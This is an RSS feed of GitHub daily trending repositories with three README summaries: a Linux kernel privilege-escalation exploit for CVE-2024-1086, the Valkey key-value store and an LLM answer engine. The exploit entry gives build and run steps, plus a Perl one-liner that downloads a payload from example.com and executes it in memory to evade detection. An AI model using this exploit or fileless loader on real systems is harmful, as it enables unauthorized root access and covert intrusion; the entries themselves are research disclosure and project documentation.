<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub All Languages Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-03-30T01:21:48Z</updated>
  <subtitle>Daily Trending of All Languages in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>Notselwyn/CVE-2024-1086</title>
    <updated>2024-03-30T01:21:48Z</updated>
    <id>tag:github.com,2024-03-30:/Notselwyn/CVE-2024-1086</id>
    <link href="https://github.com/Notselwyn/CVE-2024-1086" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Universal local privilege escalation Proof-of-Concept exploit for CVE-2024-1086, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE-2024-1086&lt;/h1&gt; &#xA;&lt;p&gt;Universal local privilege escalation Proof-of-Concept exploit for &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2024-1086&#34;&gt;CVE-2024-1086&lt;/a&gt;, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Notselwyn/CVE-2024-1086/assets/68616630/a3d43951-94ab-4c09-a14b-07b81f89b3de&#34;&gt;https://github.com/Notselwyn/CVE-2024-1086/assets/68616630/a3d43951-94ab-4c09-a14b-07b81f89b3de&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Blogpost / Write-up&lt;/h2&gt; &#xA;&lt;p&gt;A full write-up of the exploit - including background information and loads of useful diagrams - can be found in the &lt;a href=&#34;https://pwning.tech/nftables/&#34;&gt;Flipping Pages blogpost&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Affected versions&lt;/h2&gt; &#xA;&lt;p&gt;The exploit affects versions from (including) v5.14 to (including) v6.6, excluding patched branches v5.15.149&amp;gt;, v6.1.76&amp;gt;, v6.6.15&amp;gt;. The patch for these versions were released in feb 2024. The underlying vulnerability affects all versions (excluding patched stable branches) from v3.15 to v6.8-rc1.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Caveats:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The exploit does not work v6.4&amp;gt; kernels with kconfig &lt;code&gt;CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y&lt;/code&gt; (including Ubuntu v6.5)&lt;/li&gt; &#xA; &lt;li&gt;The exploits requires user namespaces (kconfig &lt;code&gt;CONFIG_USER_NS=y&lt;/code&gt;), that those user namespaces are unprivileged (sh command &lt;code&gt;sysctl kernel.unprivileged_userns_clone&lt;/code&gt; = 1), and that nf_tables is enabled (kconfig &lt;code&gt;CONFIG_NF_TABLES=y&lt;/code&gt;). By default, these are all enabled on Debian, Ubuntu, and KernelCTF. Other distro&#39;s have not been tested, but may work as well.&lt;/li&gt; &#xA; &lt;li&gt;The exploit may be unstable on systems with a lot of network activity &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Systems with WiFi adapter, when surrounded by high-usage WiFi networks, will be very unstable.&lt;/li&gt; &#xA;   &lt;li&gt;On test devices, please turn off WiFi adapters through BIOS.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;h3&gt;Configuration&lt;/h3&gt; &#xA;&lt;p&gt;The default values should work out of the box on Debian, Ubuntu, and KernelCTF with a local shell. On non-tested setups/distros, please make sure the kconfig values match with the target kernel. These can be specified in &lt;a href=&#34;https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/src/config.h&#34;&gt;&lt;code&gt;src/config.h&lt;/code&gt;&lt;/a&gt;. If you are running the exploit on a machine with more than 32GiB physical memory, make sure to increase &lt;code&gt;CONFIG_PHYS_MEM&lt;/code&gt;. If you are running the exploit over SSH (into the test machine) or a reverse shell, you may want to toggle &lt;code&gt;CONFIG_REDIRECT_LOG&lt;/code&gt; to &lt;code&gt;1&lt;/code&gt; to avoid unnecessary network activity.&lt;/p&gt; &#xA;&lt;h3&gt;Building&lt;/h3&gt; &#xA;&lt;p&gt;If this is impractical for you, there is an &lt;a href=&#34;https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit&#34;&gt;compiled x64 binary&lt;/a&gt; with the default config.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/Notselwyn/CVE-2024-1086&#xA;cd CVE-2024-1086&#xA;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Binary: &lt;code&gt;CVE-2024-1086/exploit&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Running&lt;/h3&gt; &#xA;&lt;p&gt;Running the exploit is just as trivial:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./exploit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Fileless execution is also supported, in case of pentest situations where detections need to be avoided. However, Perl needs to be installed on the target:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;perl -e &#39;&#xA;  require qw/syscall.ph/;&#xA;&#xA;  my $fd = syscall(SYS_memfd_create(), $fn, 0);&#xA;  system &#34;curl https://example.com/exploit -s &amp;gt;&amp;amp;$fd&#34;;&#xA;  exec {&#34;/proc/$$/fd/$fd&#34;} &#34;memfd&#34;;&#xA;&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;The programs and scripts (&#34;programs&#34;) in this software directory/folder/repository (&#34;repository&#34;) are published, developed and distributed for educational/research purposes only. I (&#34;the creator&#34;) do not condone any malicious or illegal usage of the programs in this repository, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with the programs in this repository.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>valkey-io/valkey</title>
    <updated>2024-03-30T01:21:48Z</updated>
    <id>tag:github.com,2024-03-30:/valkey-io/valkey</id>
    <link href="https://github.com/valkey-io/valkey" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A new project to resume development on the formerly open-source Redis project. We&#39;re calling it Valkey, like a Valkyrie.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;This README is under construction as we work to build a new community driven high performance key-value store.&lt;/p&gt; &#xA;&lt;p&gt;This project was forked from the open source Redis project right before the transition to their new source available licenses.&lt;/p&gt; &#xA;&lt;p&gt;This README is just a fast &lt;em&gt;quick start&lt;/em&gt; document. We are currently working on a more permanent documentation page.&lt;/p&gt; &#xA;&lt;h2&gt;What is Valkey?&lt;/h2&gt; &#xA;&lt;p&gt;Valkey is a high-performance data structure server that primarily serves key/value workloads. It supports a wide range of native structures and an extensible plugin system for adding new data structures and access patterns.&lt;/p&gt; &#xA;&lt;h2&gt;Building Valkey&lt;/h2&gt; &#xA;&lt;p&gt;Valkey can be compiled and used on Linux, OSX, OpenBSD, NetBSD, FreeBSD. We support big endian and little endian architectures, and both 32 bit and 64 bit systems.&lt;/p&gt; &#xA;&lt;p&gt;It may compile on Solaris derived systems (for instance SmartOS) but our support for this platform is &lt;em&gt;best effort&lt;/em&gt; and Valkey is not guaranteed to work as well as in Linux, OSX, and *BSD.&lt;/p&gt; &#xA;&lt;p&gt;It is as simple as:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To build with TLS support, you&#39;ll need OpenSSL development libraries (e.g. libssl-dev on Debian/Ubuntu) and run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make BUILD_TLS=yes&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To build with systemd support, you&#39;ll need systemd development libraries (such as libsystemd-dev on Debian/Ubuntu or systemd-devel on CentOS) and run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make USE_SYSTEMD=yes&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To append a suffix to Valkey program names, use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make PROG_SUFFIX=&#34;-alt&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can build a 32 bit Valkey binary using:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make 32bit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;After building Valkey, it is a good idea to test it using:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If TLS is built, running the tests with TLS enabled (you will need &lt;code&gt;tcl-tls&lt;/code&gt; installed):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% ./utils/gen-test-certs.sh&#xA;% ./runtest --tls&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Fixing build problems with dependencies or cached build options&lt;/h2&gt; &#xA;&lt;p&gt;Valkey has some dependencies which are included in the &lt;code&gt;deps&lt;/code&gt; directory. &lt;code&gt;make&lt;/code&gt; does not automatically rebuild dependencies even if something in the source code of dependencies changes.&lt;/p&gt; &#xA;&lt;p&gt;When you update the source code with &lt;code&gt;git pull&lt;/code&gt; or when code inside the dependencies tree is modified in any other way, make sure to use the following command in order to really clean everything and rebuild from scratch:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make distclean&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will clean: jemalloc, lua, hiredis, linenoise and other dependencies.&lt;/p&gt; &#xA;&lt;p&gt;Also if you force certain build options like 32bit target, no C compiler optimizations (for debugging purposes), and other similar build time options, those options are cached indefinitely until you issue a &lt;code&gt;make distclean&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;h2&gt;Fixing problems building 32 bit binaries&lt;/h2&gt; &#xA;&lt;p&gt;If after building Valkey with a 32 bit target you need to rebuild it with a 64 bit target, or the other way around, you need to perform a &lt;code&gt;make distclean&lt;/code&gt; in the root directory of the Valkey distribution.&lt;/p&gt; &#xA;&lt;p&gt;In case of build errors when trying to build a 32 bit binary of Valkey, try the following steps:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install the package libc6-dev-i386 (also try g++-multilib).&lt;/li&gt; &#xA; &lt;li&gt;Try using the following command line instead of &lt;code&gt;make 32bit&lt;/code&gt;: &lt;code&gt;make CFLAGS=&#34;-m32 -march=native&#34; LDFLAGS=&#34;-m32&#34;&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Allocator&lt;/h2&gt; &#xA;&lt;p&gt;Selecting a non-default memory allocator when building Valkey is done by setting the &lt;code&gt;MALLOC&lt;/code&gt; environment variable. Valkey is compiled and linked against libc malloc by default, with the exception of jemalloc being the default on Linux systems. This default was picked because jemalloc has proven to have fewer fragmentation problems than libc malloc.&lt;/p&gt; &#xA;&lt;p&gt;To force compiling against libc malloc, use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make MALLOC=libc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To compile against jemalloc on Mac OS X systems, use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make MALLOC=jemalloc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Monotonic clock&lt;/h2&gt; &#xA;&lt;p&gt;By default, Valkey will build using the POSIX clock_gettime function as the monotonic clock source. On most modern systems, the internal processor clock can be used to improve performance. Cautions can be found here: &lt;a href=&#34;http://oliveryang.net/2015/09/pitfalls-of-TSC-usage/&#34;&gt;http://oliveryang.net/2015/09/pitfalls-of-TSC-usage/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;To build with support for the processor&#39;s internal instruction clock, use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make CFLAGS=&#34;-DUSE_PROCESSOR_CLOCK&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Verbose build&lt;/h2&gt; &#xA;&lt;p&gt;Valkey will build with a user-friendly colorized output by default. If you want to see a more verbose output, use the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make V=1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Running Valkey&lt;/h2&gt; &#xA;&lt;p&gt;To run Valkey with the default configuration, just type:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% cd src&#xA;% ./valkey-server&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you want to provide your valkey.conf, you have to run it using an additional parameter (the path of the configuration file):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% cd src&#xA;% ./valkey-server /path/to/valkey.conf&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It is possible to alter the Valkey configuration by passing parameters directly as options using the command line. Examples:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% ./valkey-server --port 9999 --replicaof 127.0.0.1 6379&#xA;% ./valkey-server /etc/valkey/6379.conf --loglevel debug&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;All the options in valkey.conf are also supported as options using the command line, with exactly the same name.&lt;/p&gt; &#xA;&lt;h2&gt;Running Valkey with TLS:&lt;/h2&gt; &#xA;&lt;p&gt;Please consult the &lt;a href=&#34;https://raw.githubusercontent.com/valkey-io/valkey/unstable/TLS.md&#34;&gt;TLS.md&lt;/a&gt; file for more information on how to use Valkey with TLS.&lt;/p&gt; &#xA;&lt;h2&gt;Playing with Valkey&lt;/h2&gt; &#xA;&lt;p&gt;You can use valkey-cli to play with Valkey. Start a valkey-server instance, then in another terminal try the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% cd src&#xA;% ./valkey-cli&#xA;valkey&amp;gt; ping&#xA;PONG&#xA;valkey&amp;gt; set foo bar&#xA;OK&#xA;valkey&amp;gt; get foo&#xA;&#34;bar&#34;&#xA;valkey&amp;gt; incr mycounter&#xA;(integer) 1&#xA;valkey&amp;gt; incr mycounter&#xA;(integer) 2&#xA;valkey&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Installing Valkey&lt;/h2&gt; &#xA;&lt;p&gt;In order to install Valkey binaries into /usr/local/bin, just use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% make install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can use &lt;code&gt;make PREFIX=/some/other/directory install&lt;/code&gt; if you wish to use a different destination.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;make install&lt;/code&gt; will just install binaries in your system, but will not configure init scripts and configuration files in the appropriate place. This is not needed if you just want to play a bit with Valkey, but if you are installing it the proper way for a production system, we have a script that does this for Ubuntu and Debian systems:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;% cd utils&#xA;% ./install_server.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Note&lt;/em&gt;: &lt;code&gt;install_server.sh&lt;/code&gt; will not work on Mac OSX; it is built for Linux only.&lt;/p&gt; &#xA;&lt;p&gt;The script will ask you a few questions and will setup everything you need to run Valkey properly as a background daemon that will start again on system reboots.&lt;/p&gt; &#xA;&lt;p&gt;You&#39;ll be able to stop and start Valkey using the script named &lt;code&gt;/etc/init.d/valkey_&amp;lt;portnumber&amp;gt;&lt;/code&gt;, for instance &lt;code&gt;/etc/init.d/valkey_6379&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Code contributions&lt;/h2&gt; &#xA;&lt;p&gt;Please see the &lt;a href=&#34;https://github.com/valkey-io/valkey/raw/unstable/CONTRIBUTING.md&#34;&gt;CONTRIBUTING.md&lt;/a&gt;. For security bugs and vulnerabilities, please see &lt;a href=&#34;https://github.com/valkey-io/valkey/raw/unstable/SECURITY.md&#34;&gt;SECURITY.md&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>developersdigest/llm-answer-engine</title>
    <updated>2024-03-30T01:21:48Z</updated>
    <id>tag:github.com,2024-03-30:/developersdigest/llm-answer-engine</id>
    <link href="https://github.com/developersdigest/llm-answer-engine" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Build a Perplexity-Inspired Answer Engine Using Next.js, Groq, Mixtral, Langchain, OpenAI, Brave &amp; Serper&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Perplexity-Inspired LLM Answer Engine&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://youtu.be/kFC-OWw7G8k&#34;&gt;Watch the tutorial here&lt;/a&gt; for a detailed guide on setting up and running this project.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZmJ0ZnhmNjkwYzczZDlqZzM1dDRka2k1MGx6dW02ZHl5dzV0aGQwMiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/mluzeYSMGoAnSXg0ft/giphy.gif&#34; alt=&#34;Example&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;This repository contains the code and instructions needed to build a sophisticated answer engine that leverages the capabilities of &lt;a href=&#34;https://www.groq.com/&#34;&gt;Groq&lt;/a&gt;, &lt;a href=&#34;https://mistral.ai/news/mixtral-of-experts/&#34;&gt;Mistral AI&#39;s Mixtral&lt;/a&gt;, &lt;a href=&#34;https://js.langchain.com/docs/&#34;&gt;Langchain.JS&lt;/a&gt;, &lt;a href=&#34;https://search.brave.com/&#34;&gt;Brave Search&lt;/a&gt;, &lt;a href=&#34;https://serper.dev/&#34;&gt;Serper API&lt;/a&gt;, and &lt;a href=&#34;https://openai.com/&#34;&gt;OpenAI&lt;/a&gt;. Designed to efficiently return sources, answers, images, videos, and follow-up questions based on user queries, this project is an ideal starting point for developers interested in natural language processing and search technologies.&lt;/p&gt; &#xA;&lt;h2&gt;Technologies Used&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Next.js&lt;/strong&gt;: A React framework for building server-side rendered and static web applications.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Tailwind CSS&lt;/strong&gt;: A utility-first CSS framework for rapidly building custom user interfaces.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Vercel AI SDK&lt;/strong&gt;: The Vercel AI SDK is a library for building AI-powered streaming text and chat UIs.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Groq &amp;amp; Mixtral&lt;/strong&gt;: Technologies for processing and understanding user queries.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Langchain.JS&lt;/strong&gt;: A JavaScript library focused on text operations, such as text splitting and embeddings.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Brave Search&lt;/strong&gt;: A privacy-focused search engine used for sourcing relevant content and images.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Serper API&lt;/strong&gt;: Used for fetching relevant video and image results based on the user&#39;s query.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;OpenAI Embeddings&lt;/strong&gt;: Used for creating vector representations of text chunks.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Cheerio&lt;/strong&gt;: Utilized for HTML parsing, allowing the extraction of content from web pages.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Ollama (Optional)&lt;/strong&gt;: Used for streaming inference and embeddings.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;h3&gt;Prerequisites&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Ensure Node.js and npm are installed on your machine.&lt;/li&gt; &#xA; &lt;li&gt;Obtain API keys from OpenAI, Groq, Brave Search, and Serper.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Obtaining API Keys&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;OpenAI API Key&lt;/strong&gt;: &lt;a href=&#34;https://platform.openai.com/account/api-keys&#34;&gt;Generate your OpenAI API key here&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Groq API Key&lt;/strong&gt;: &lt;a href=&#34;https://console.groq.com/keys&#34;&gt;Get your Groq API key here&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Brave Search API Key&lt;/strong&gt;: &lt;a href=&#34;https://brave.com/search/api/&#34;&gt;Obtain your Brave Search API key here&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Serper API Key&lt;/strong&gt;: &lt;a href=&#34;https://serper.dev/&#34;&gt;Get your Serper API key here&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Installation&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Clone the repository: &lt;pre&gt;&lt;code&gt;git clone https://github.com/yourusername/perplexity-inspired-llm-answer-engine.git&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;Install the required dependencies: &lt;pre&gt;&lt;code&gt;npm install&#xA;&lt;/code&gt;&lt;/pre&gt; or &lt;pre&gt;&lt;code&gt;bun install&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;Create a &lt;code&gt;.env&lt;/code&gt; file in the root of your project and add your API keys: &lt;pre&gt;&lt;code&gt;OPENAI_API_KEY=your_openai_api_key&#xA;GROQ_API_KEY=your_groq_api_key&#xA;BRAVE_SEARCH_API_KEY=your_brave_search_api_key&#xA;SERPER_API=your_serper_api_key&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Running the Server&lt;/h3&gt; &#xA;&lt;p&gt;To start the server, execute:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;npm run dev&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;bun run dev&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;the server will be listening on the specified port.&lt;/p&gt; &#xA;&lt;h2&gt;Editing the Configuration&lt;/h2&gt; &#xA;&lt;p&gt;The configuration file is located in the &lt;code&gt;app/config.tsx&lt;/code&gt; file. You can modify the following values&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;useOllamaInference: false,&lt;/li&gt; &#xA; &lt;li&gt;useOllamaEmbeddings: false,&lt;/li&gt; &#xA; &lt;li&gt;inferenceModel: &#39;mixtral-8x7b-32768&#39;,&lt;/li&gt; &#xA; &lt;li&gt;inferenceAPIKey: process.env.GROQ_API_KEY,&lt;/li&gt; &#xA; &lt;li&gt;embeddingsModel: &#39;text-embedding-3-small&#39;,&lt;/li&gt; &#xA; &lt;li&gt;textChunkSize: 800,&lt;/li&gt; &#xA; &lt;li&gt;textChunkOverlap: 200,&lt;/li&gt; &#xA; &lt;li&gt;numberOfSimilarityResults: 2,&lt;/li&gt; &#xA; &lt;li&gt;numberOfPagesToScan: 10,&lt;/li&gt; &#xA; &lt;li&gt;nonOllamaBaseURL: &#39;&lt;a href=&#34;https://api.groq.com/openai/v1&#34;&gt;https://api.groq.com/openai/v1&lt;/a&gt;&#39;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Ollama Support (Partially supported)&lt;/h3&gt; &#xA;&lt;p&gt;Currently, streaming text responses are supported for Ollama, but follow-up questions are not yet supported.&lt;/p&gt; &#xA;&lt;p&gt;Embeddings are supported, however, time-to-first-token can be quite long when using both a local embedding model as well as a local model for the streaming inference. I recommended decreasing a number of the RAG values specified in the &lt;code&gt;app/config.tsx&lt;/code&gt; file to decrease the time-to-first-token when using Ollama.&lt;/p&gt; &#xA;&lt;p&gt;To get started, make sure you have the Ollama running model on your local machine and set within the config the model you would like to use and set use OllamaInference and/or useOllamaEmbeddings to true.&lt;/p&gt; &#xA;&lt;p&gt;Note: When &#39;useOllamaInference&#39; is set to true, the model will be used for both text generation, but it will skip the follow-up questions inference step when using Ollama.&lt;/p&gt; &#xA;&lt;p&gt;More info: &lt;a href=&#34;https://ollama.com/blog/openai-compatibility&#34;&gt;https://ollama.com/blog/openai-compatibility&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Roadmap&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;[In progress] Add support for dynamic and conditionally rendered UI components based on the user&#39;s query&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExN284d3p5azAyNHpubm9mb2F0cnB6MWdtcTdnd2Nkb2d1ZnRtMG0yYiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/OMpt8ZbBsjphZz6mue/giphy.gif&#34; alt=&#34;Example&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;[] Add a settings component to allow users to select the model, embeddings model, and other parameters from the UI&lt;/li&gt; &#xA; &lt;li&gt;[] Add support for follow-up questions when using Ollama&lt;/li&gt; &#xA; &lt;li&gt;[Completed] Add dark mode support based on the user&#39;s system preference&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZDQxdHR0NWc4MHl6cDBsNmpiMGNyeWNwbnE4MjZlb29oZGRsODBhMCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/QjINYAx6le5PMY020A/giphy.gif&#34; alt=&#34;Example&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Backend + Node Only Express API&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://img.youtube.com/vi/43ZCeBTcsS8/0.jpg&#34; alt=&#34;Build a Perplexity-Inspired Answer Engine Using Groq, Mixtral, Langchain, Brave &amp;amp; OpenAI in 10 Min&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;In addition to the Next.JS version of the project, there is a backend only version that uses Node.js and Express. Which is located in the &#39;original-express-api&#39; directory. This is a standalone version of the project that can be used as a reference for building a similar API. There is also a readme file in the &#39;original-express-api&#39; directory that explains how to run the backend version.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://youtu.be/43ZCeBTcsS8&#34;&gt;Watch the express tutorial here&lt;/a&gt; for a detailed guide on setting up and running this project.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Contributions to the project are welcome. Feel free to fork the repository, make your changes, and submit a pull request. You can also open issues to suggest improvements or report bugs.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;This project is licensed under the MIT License.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://star-history.com/#developersdigest/llm-answer-engine&amp;amp;Date&#34;&gt;&lt;img src=&#34;https://api.star-history.com/svg?repos=developersdigest/llm-answer-engine&amp;amp;type=Date&#34; alt=&#34;Star History Chart&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;I&#39;m the developer behind Developers Digest. If you find my work helpful or enjoy what I do, consider supporting me. Here are a few ways you can do that:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Patreon&lt;/strong&gt;: Support me on Patreon at &lt;a href=&#34;https://www.patreon.com/DevelopersDigest&#34;&gt;patreon.com/DevelopersDigest&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Buy Me A Coffee&lt;/strong&gt;: You can buy me a coffee at &lt;a href=&#34;https://www.buymeacoffee.com/developersdigest&#34;&gt;buymeacoffee.com/developersdigest&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Website&lt;/strong&gt;: Check out my website at &lt;a href=&#34;https://developersdigest.tech&#34;&gt;developersdigest.tech&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Github&lt;/strong&gt;: Follow me on GitHub at &lt;a href=&#34;https://github.com/developersdigest&#34;&gt;github.com/developersdigest&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Twitter&lt;/strong&gt;: Follow me on Twitter at &lt;a href=&#34;https://twitter.com/dev__digest&#34;&gt;twitter.com/dev__digest&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>